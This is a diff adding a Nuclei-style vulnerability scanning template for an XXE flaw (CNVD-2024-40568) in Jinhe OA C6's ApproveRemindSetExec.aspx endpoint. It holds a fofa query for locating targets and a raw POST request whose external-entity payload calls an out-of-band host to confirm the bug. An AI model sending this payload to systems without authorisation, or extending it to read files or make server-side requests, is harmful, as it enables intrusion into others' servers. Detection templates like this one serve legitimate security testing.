@@ -1,0 +1,32 @@
+id: CNVD-2024-40568
+
+info:
+  name: Jinhe OA C6 ApproveRemindSetExec.aspx - XML External Entity Injection
+  author: qwtd
+  severity: high
+  description: |
+    金和OA-C6系统接口ApproveRemindSetExec.aspx存在XXE漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="金和网络-金和OA"
+  tags: 金和网络-金和OA
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/xml
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
